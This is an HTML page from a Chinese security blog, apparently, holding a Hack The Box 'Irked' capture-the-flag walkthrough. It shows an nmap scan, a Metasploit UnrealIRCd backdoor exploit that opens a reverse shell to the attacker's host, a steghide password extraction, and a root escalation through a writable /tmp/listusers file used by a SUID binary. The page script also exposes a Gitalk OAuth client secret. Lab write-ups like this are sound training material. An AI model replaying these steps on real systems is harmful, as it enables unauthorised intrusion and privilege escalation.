@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Irked - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Irked靶场信息  靶场类型  信息收集Nmap┌──(root💀lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.117">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Irked - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Irked靶场信息  靶场类型  信息收集Nmap┌──(root💀lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.117">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/2e3a4dff-7102-4a8c-847b-44463ff7d309.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/d9b9ac71-2069-422f-bca0-f2e16f6b89a1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/9b0067e6-70a4-48bc-bdd0-e6435cb989cb.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/dcdac2f8-04a4-4d5e-bcf7-5b284ac7d6e4.png">
+<meta property="article:published_time" content="2022-04-29T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:45:08.325Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/2e3a4dff-7102-4a8c-847b-44463ff7d309.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Irked - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Irked - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-04-29T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-04-29
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Irked"><span class="post-toc-text">Hackthebox - Irked</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Metasploit"><span class="post-toc-text">Metasploit</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#HTTP"><span class="post-toc-text">HTTP</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#User"><span class="post-toc-text">User</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升-1"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Easy/Hackthebox-Irked"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Irked - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-04-29 19:38:36" datetime="2022-04-29T11:38:36.000Z"  itemprop="datePublished">2022-04-29</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Irked"><a href="#Hackthebox-Irked" class="headerlink" title="Hackthebox - Irked"></a>Hackthebox - Irked</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/2e3a4dff-7102-4a8c-847b-44463ff7d309.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/d9b9ac71-2069-422f-bca0-f2e16f6b89a1.png" class>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root💀lucifiel)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.117                                                                                                                                        1 ⚙
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-29 10:23 CST
+Nmap scan report for 10.10.10.117
+Host is up (0.17s latency).
+Not shown: 65528 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey:
+|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
+|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
+|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
+|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Site doesn&#39;t have a title (text/html).
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          49297/tcp   status
+|   100024  1          50541/udp   status
+|   100024  1          51791/udp6  status
+|_  100024  1          60368/tcp6  status
+6697/tcp  open  irc     UnrealIRCd
+8067/tcp  open  irc     UnrealIRCd
+49297/tcp open  status  1 (RPC #100024)
+65534/tcp open  irc     UnrealIRCd
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=4/29%OT=22%CT=1%CU=32566%PV=Y%DS=2%DC=T%G=Y%TM=626B4C5
+OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
+OS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 143/tcp)
+HOP RTT       ADDRESS
+1   170.14 ms 10.10.14.1
+2   170.23 ms 10.10.10.117
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.84 seconds
+</code></pre>
+<p>这边有一个 111 端口，看着像是 rpcbind 方面的漏洞，好像是缓冲区溢出相关的，使用 msf 检查试试</p>
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><pre><code class="bash">msf6 auxiliary(scanner/misc/sunrpc_portmapper) &gt; show options 
+
+Module options (auxiliary/scanner/misc/sunrpc_portmapper):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PROTOCOL  tcp              yes       Protocol to use (Accepted: tcp, udp)
+   RHOSTS    10.10.10.117     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT     111              yes       The target port (TCP)
+   THREADS   1                yes       The number of concurrent threads (max one per host)
+</code></pre>
+<p>设置好后去执行</p>
+<pre><code class="bash">msf6 auxiliary(scanner/misc/sunrpc_portmapper) &gt; exploit 
+
+[+] 10.10.10.117:111      - SunRPC Programs for 10.10.10.117
+================================
+
+ Name     Number  Version  Port   Protocol
+ ----     ------  -------  ----   --------
+ rpcbind  100000  4        111    tcp
+ rpcbind  100000  3        111    tcp
+ rpcbind  100000  2        111    tcp
+ rpcbind  100000  4        111    udp
+ rpcbind  100000  3        111    udp
+ rpcbind  100000  2        111    udp
+ status   100024  1        50541  udp
+ status   100024  1        49297  tcp
+
+[*] 10.10.10.117:111      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+<p>扫描到了，但是无法利用成功，换个其他地方继续看</p>
+<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><img src="/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/9b0067e6-70a4-48bc-bdd0-e6435cb989cb.png" class>
+
+<p>Web 服务提示 IRC 可以正常工作，这里 6697、8067、65534 似乎都是 IRC 服务，去搜索一下 IRC 是什么东西</p>
+<img src="/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/dcdac2f8-04a4-4d5e-bcf7-5b284ac7d6e4.png" class>
+
+<p>搜索 WIKI 发现，IRC 是一种应用层的协议，主要用于群体聊天，通常使用的端口是 6667 和 6697，正好我们这里有 6697</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><pre><code class="bash">msf6 &gt; search Unreal
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/linux/games/ut2004_secure           2004-06-18       good       Yes    Unreal Tournament 2004 &quot;secure&quot; Overflow (Linux)
+   1  exploit/windows/games/ut2004_secure         2004-06-18       good       Yes    Unreal Tournament 2004 &quot;secure&quot; Overflow (Win32)
+   2  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
+
+Interact with a module by name or index. For example info 2, use 2 or use exploit/unix/irc/unreal_ircd_3281_backdoor
+</code></pre>
+<p>使用 msf 搜到了一个脚本，去使用一下</p>
+<pre><code class="bash">msf6 &gt; use 2
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; show options 
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT   6667             yes       The target port (TCP)
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+</code></pre>
+<p>设置好 RHOSTS，然后执行</p>
+<pre><code class="bash">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set payload cmd/unix/reverse
+payload =&gt; cmd/unix/reverse
+
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set rhosts 10.10.10.117
+rhosts =&gt; 10.10.10.117
+
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set lhost 10.10.16.12
+lhost =&gt; 10.10.16.12
+
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set rport 6697
+rport =&gt; 6697
+</code></pre>
+<pre><code class="bash">msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; exploit 
+
+[*] Started reverse TCP double handler on 10.10.16.12:4444 
+[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
+    :irked.htb NOTICE AUTH :*** Looking up your hostname...
+[*] 10.10.10.117:6697 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo SUUjSBbQaAoSC5R9;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: &quot;SUUjSBbQaAoSC5R9\r\n&quot;
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.16.12:4444 -&gt; 10.10.10.117:51640) at 2022-04-28 22:55:02 -0400
+
+whoami&amp;&amp;id
+ircd
+uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
+</code></pre>
+<p>接着使用 shell 进入 shell 模式</p>
+<pre><code class="bash">shell
+python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+</code></pre>
+<pre><code class="bash">ircd@irked:/home/djmardov/Documents$ ls -la
+ls -la
+total 16
+drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
+drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
+-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
+-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
+</code></pre>
+<p>有点奇怪，明明是 Linux 系统，djmardov 用户目录却是 Windows 的系统结构</p>
+<p>在目录 &#x2F;home&#x2F;djmardov&#x2F;Documents 中找到了 user.txt flag 文件，但是我们权限不够，还有一个 .backup 文件，我们有查看权限，看一下是什么</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><pre><code class="bash">ircd@irked:/home/djmardov/Documents$ cat .backup
+cat .backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+</code></pre>
+<p>我直接拿着这段密码去登录 djmardov 账户是不行的，提示失败</p>
+<p>然后看着提示，这似乎是一段 steg 的编码，而我们又没有要解密的文件，这时候我想起来，密码一般会藏在哪？当然是图片里，而哪里有图片呢？HTTP 服务的主页有一张图片！</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# steghide extract -sf irked.jpg                                            1 ⨯
+Enter passphrase: 
+wrote extracted data to &quot;pass.txt&quot;.
+</code></pre>
+<p>在这提示我们输入密码，刚才 .backup 里的密码就有用处了，输入密码后解压出来一个 pass.txt 文件</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# cat pass.txt    
+Kab6h+m+bbp2J:HG
+</code></pre>
+<p>得到了密码</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ssh djmardov@10.10.10.117     
+djmardov@10.10.10.117&#39;s password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Apr 28 04:38:52 2022 from 10.10.14.3
+djmardov@irked:~$ whoami&amp;&amp;id
+djmardov
+uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
+</code></pre>
+<p>成功提权到 user 用户</p>
+<pre><code class="bash">djmardov@irked:~/Documents$ cat user.txt 
+4a66a78b12dc0e661a59d3f5c0267a8e
+</code></pre>
+<p>成功拿到 user 权限的 flag 文件</p>
+<h1 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升"></a>权限提升</h1><pre><code class="bash">djmardov@irked:~$ find / -user root -perm -4000 -print 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/sbin/exim4
+/usr/sbin/pppd
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/X
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/viewuser
+/sbin/mount.nfs
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ntfs-3g
+/bin/umount
+</code></pre>
+<p>使用 find 查找一下特殊权限文件</p>
+<p>找到了一个 &#x2F;usr&#x2F;bin&#x2F;viewuser 文件，查看一下</p>
+<pre><code class="bash">djmardov@irked:/usr/bin$ ./viewuser 
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2022-04-28 02:46 (:0)
+djmardov pts/5        2022-04-28 23:22 (10.10.16.12)
+/tmp/listusers: connect: Connection refused
+</code></pre>
+<p>发现这里似乎调用了一个 &#x2F;tmp&#x2F;listusers</p>
+<p>向 &#x2F;tmp&#x2F;listusers 写入文件</p>
+<pre><code class="bash">echo &quot;/bin/sh&quot; &gt; /tmp/listusers
+</code></pre>
+<p>接着执行 &#x2F;usr&#x2F;bin&#x2F;viewuser</p>
+<pre><code class="bash">djmardov@irked:/tmp$ echo &quot;/bin/sh&quot; &gt; /tmp/listusers
+djmardov@irked:/tmp$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2022-04-28 02:46 (:0)
+djmardov pts/5        2022-04-28 23:52 (10.10.16.12)
+# whoami&amp;&amp;id
+root
+uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
+</code></pre>
+<p>成功提权到 root 权限</p>
+<pre><code class="bash"># cat /root/root.txt
+8d8e9e8be64654b6dccc3bff4522daf3
+</code></pre>
+<p>成功拿到 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/&title=《Irked - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/&title=《Irked - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Irked - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/05/05/TryHackMe/TryHackMe-Overpass/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Overpass - TryHackMe</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/04/28/Hackthebox/Easy/Hackthebox-Curling/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Curling - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/&title=《Irked - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/&title=《Irked - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Irked - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
